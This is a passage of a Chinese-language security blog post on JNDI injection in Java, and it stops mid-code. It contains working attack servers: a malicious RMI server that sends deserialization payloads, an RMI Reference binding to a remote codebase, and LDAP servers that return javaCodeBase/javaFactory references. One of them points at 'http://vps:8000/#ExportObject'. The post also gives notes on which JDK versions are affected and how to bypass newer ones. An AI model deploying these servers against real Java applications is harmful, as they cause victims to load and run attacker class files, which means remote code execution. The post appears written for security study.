String.class;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Not allowed to read object&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ObjID read;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            read = ObjID.read(ois);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (read.hashCode() == <span class="number">2</span>) &#123;</span><br><span class="line">            handleDGC(ois);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (read.hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.handleRMI(s, ois, out)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.hadConnection = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="built_in">this</span>.waitLock) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.waitLock.notifyAll();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">handleRMI</span><span class="params">(Socket s, ObjectInputStream ois, DataOutputStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">method</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">        ois.readLong();</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">object</span> <span class="operator">=</span> (String)ois.readObject();</span><br><span class="line">            out.writeByte(<span class="number">81</span>);</span><br><span class="line"></span><br><span class="line">            Object obj;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(out, <span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">                oos.writeByte(<span class="number">1</span>);</span><br><span class="line">                (<span class="keyword">new</span> <span class="title class_">UID</span>()).write(oos);</span><br><span class="line">                <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span> + object;</span><br><span class="line">                log.info(<span class="string">&quot;[RMI Server] Send payloadData for &quot;</span> + path);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">                obj = PayloadGenerator.getPayload();<span class="comment">//替换为序列化数据</span></span><br><span class="line">                oos.writeObject(obj);</span><br><span class="line">                oos.flush();</span><br><span class="line">                out.flush();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleDGC</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.readInt();</span><br><span class="line">        ois.readLong();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MarshalOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String sendUrl;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MarshalOutputStream</span><span class="params">(OutputStream out, String u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>(out);</span><br><span class="line">            <span class="built_in">this</span>.sendUrl = u;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MarshalOutputStream(OutputStream out) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>(out);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">annotateClass</span><span class="params">(Class&lt;?&gt; cl)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.sendUrl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.writeObject(<span class="built_in">this</span>.sendUrl);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(cl.getClassLoader() <span class="keyword">instanceof</span> URLClassLoader)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.writeObject((Object)<span class="literal">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                URL[] us = ((URLClassLoader)cl.getClassLoader()).getURLs();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(URL u : us) &#123;</span><br><span class="line">                    cb = cb + u.toString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.writeObject(cb);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">annotateProxyClass</span><span class="params">(Class&lt;?&gt; cl)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">this</span>.annotateClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改handleRMI处即可替换恶意stub。</p>
+<h3 id="codebase加载字节码"><a href="#codebase加载字节码" class="headerlink" title="codebase加载字节码"></a>codebase加载字节码</h3><p>这个只适用于jdk &lt; 8u121，jdk &lt; 7u131，jdk &lt; 6u141</p>
+<p>jndi lookup时，会返回一个Reference对象。当jndi client获取到Reference时，会去加载里面的className参数对应的对象，当加载不到的时候，会从urlclassloader加载，加载的地址是factoryLocation参数，这里我们构造一个恶意类的绑定到对应地址，恶意类的构造方法或者初始化方法里面实现一些恶意代码，即可；客户端会对这个恶意类进行加载和创建实例。</p>
+<p>RMIServer：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// factory表示加载的类的url和类名，所以恶意类文件必须以全类名命名</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc1233&quot;</span>, <span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;http://127.0.0.1:7777/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Calc123&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JndiClient：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Calc123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>ldap是一种目录访问协议。命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而到了LDAP，目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。</p>
+<h3 id="codebase加载字节码-1"><a href="#codebase加载字节码-1" class="headerlink" title="codebase加载字节码"></a>codebase加载字节码</h3><p>跟上面RMI的过程一样，也是返回一个带有Reference的对象，里面执行恶意工厂的地址。适用于&lt;8u191</p>
+<p>直接搬其他师傅写好的服务了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LDAP server</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    run();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line">    <span class="comment">//TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost/#Calc&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">      config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">          <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">          InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">          port,</span><br><span class="line">          ServerSocketFactory.getDefault(),</span><br><span class="line">          SocketFactory.getDefault(),</span><br><span class="line">          (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">      config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">      <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">      System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">      ds.startListening();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">      <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        sendResult(result, base, e);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span></span><br><span class="line">        <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">      <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;&quot;</span>));</span><br><span class="line">      System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">      <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">      &#125;</span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">      e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">      e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">      result.sendSearchEntry(e);</span><br><span class="line">      result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="返回恶意序列化数据"><a href="#返回恶意序列化数据" class="headerlink" title="返回恶意序列化数据"></a>返回恶意序列化数据</h3><p>用于绕过&gt;8u191情况，但是在某些高版本jdk也被禁用了，比如11.0.25，17.0.16，具体看VersionHelper12&#x2F;VersionHelper类中有没有类似：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762756206106-835106d8-aeef-48fd-9248-06951090b6f4.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762756226005-60cefe6c-8c1b-46e3-a668-9a2e42698465.png"  alt="img"></p>
+<p>前者可用，后者被禁。</p>
+<p>恶意ldap服务器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LDAP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> tools.PayloadGen;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">deserServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://vps:8000/#ExportObject&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 